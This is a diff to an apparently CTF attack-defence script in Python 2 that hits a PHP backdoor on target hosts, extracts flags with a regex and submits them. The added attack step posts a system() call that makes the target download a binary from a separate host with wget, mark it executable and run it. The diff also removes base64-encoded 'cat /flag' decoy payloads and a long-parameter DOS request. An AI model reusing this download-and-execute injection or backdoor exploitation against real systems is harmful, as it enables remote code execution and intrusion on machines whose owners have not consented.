@@ -1,7 +1,9 @@
 #-*- coding: utf-8 -*-
-
 import requests
+import hackhttp
+import thread_pool
 from setting import PATTERN,SUBMIT_URL
+import re
 
 def submitflag(flag):
     requests.get(SUBMIT_URL+flag)
@@ -10,37 +12,46 @@ class Beating():
     def __init__(self,url):
         self.url = url
         self.sess = requests.session()
+        self.hh = hackhttp.hackhttp(hackhttp.httpconpool())
+        self.tp = thread_pool.ThreadPool(500)
+        self.headers = headers_dict = {
+            'X-Forwarder-For': '192.168.1.1',
+        }
 
-    def login(self):
-        pass
-
-    def obfs(self,url):
-        print '[*]Obfsing '+self.url
-        gets = ["/ctools_export_ui.class.php?token=highlight_file(%22/flag%22);","/authorize.php?batch=c3lzdGVtKCJjYXQgL2ZsYWciKTs=","/system.api.php?q=ZWNobyBmaWxlX2dldF9jb250ZW50cygiL2ZsYWciKTs=","/view.php?file=print_r(file_get_contents(%22/flag%22));"]
-        posts = [('/ctools_export_ui.class.php',{'ajax_html_ids':'c3lzdGVtKCJjYXQgL2ZsYWciKTs='}),('/statistics.php',{'nid':'cHJpbnRfcihmaWxlX2dldF9jb250ZW50cygiL2ZsYWciKSk7'})]
-        for g in gets:
-            requests.get(url+g,timeout=2)
-        for p in posts:
-            requests.post(url+p[0],data=p[1],timeout=2)
-
-    def DOS(self,url):
-        print '[*]DOSing '+self.url
-        requests.get(url+'/index.php?id='+'A'*0x1000,timeout=2)
-    #huasir
     def attack(self):
         print '[*]Attacking '+self.url
         try:
-            res = self.sess.post(self.url+'/.index.php',data={'0':'huasir','1':'system("cd /tmp&&wget -O xxx 127.0.0.1/check&&chmod +x xxx&&./xxx");'},timeout=3)
-            res = re.findall(PATTERN,res.content)
-            if len(res):
+            uri = '/?0=huasir&1=system(%27cat%20/tmp/flag%27);'
+#             raw = '''GET /?0=huasir&1=system(%27cat%20/tmp/flag%27); HTTP/1.1
+# Host: 127.0.0.1
+# User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0
+# Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+# Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
+# Accept-Encoding: gzip, deflate
+# Connection: keep-alive
+# Upgrade-Insecure-Requests: 1'''
+#             _, _, res, _, log = self.hh.http(self.url+uri, raw=raw)
+
+            res = self.sess.post(self.url+'/index.php',data={'0':'huasir','1':'system("cd /tmp&&wget -O check http://192.168.154.1/check&&chmod +x check && ./check");'},timeout=3).content
+
+            print res 
+            flag = re.findall('flag{\S*}',res.strip())
+
+            # print flag
+            if len(flag):
                 # print self.url
-                print res[0]
-                submitflag(res[0])
+                print '[+]Flag: '+flag[0]
+                try:
+                    submitflag(flag[0])
+                except Exception:
+                    print "[-]Submit flag error"
+                    pass
         except Exception:
+            print "[-]Attack fail"
             pass
 
 def B():
-    targets = ['http://192.168.1.143']
+    targets = ['http://192.168.221.132']
     for tt in targets:
         BB = Beating(tt)
         BB.attack()
